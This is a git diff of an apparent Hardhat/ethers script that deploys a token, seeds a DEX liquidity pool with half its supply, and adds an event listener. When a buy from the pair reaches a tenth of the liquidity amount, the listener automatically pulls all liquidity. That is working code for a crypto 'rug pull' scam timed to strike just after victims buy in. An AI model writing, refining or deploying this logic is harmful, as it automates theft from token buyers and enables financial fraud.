@@ -26,7 +26,7 @@ async function deploy(
   // Get info
   const tkAddress = await tk.getAddress();
   const totalSupply = await tk.totalSupply();
-  const amountToLiquidity = totalSupply / 2n;
+  const amountToLiquidity = totalSupply / 2n; //50% to liquidity
 
   // Approve for router to use token
   const approveTx = await tk.approve(routerAddress, totalSupply);
@@ -56,7 +56,7 @@ async function deploy(
     `\nWETH in pair: ${ethers.formatEther(await weth.balanceOf(pairAddress))}`
   );
 
-  return { tkAddress, pairAddress };
+  return { tkAddress, pairAddress, tk, amountToLiquidity };
 }
 
 async function rmLiqETH(
@@ -89,15 +89,13 @@ async function rmLiqETH(
   );
   await removeLiquidityTx.wait();
   console.log("Removed liquidity tx hash:", removeLiquidityTx.hash);
-
-  return removeLiquidityTx.hash;
 }
 
 async function main() {
   const [deployer, _] = await ethers.getSigners();
   const router = await ethers.getContractAt("IRouter", routerAddress);
 
-  const { tkAddress, pairAddress } = await deploy(
+  const { tkAddress, pairAddress, tk, amountToLiquidity } = await deploy(
     deployer,
     router,
     "Token Name",
@@ -106,7 +104,16 @@ async function main() {
     "0.5"
   );
 
-  await rmLiqETH(deployer, router, tkAddress, pairAddress);
+  tk.on("Transfer", async (from, to, amount, event) => {
+    if (from == pairAddress && amount >= amountToLiquidity / 10n) {
+      try {
+        await rmLiqETH(deployer, router, tkAddress, pairAddress);
+        await tk.removeAllListeners();
+      } catch (err) {
+        console.log(err);
+      }
+    }
+  });
 }
 
 main().catch((error) => {
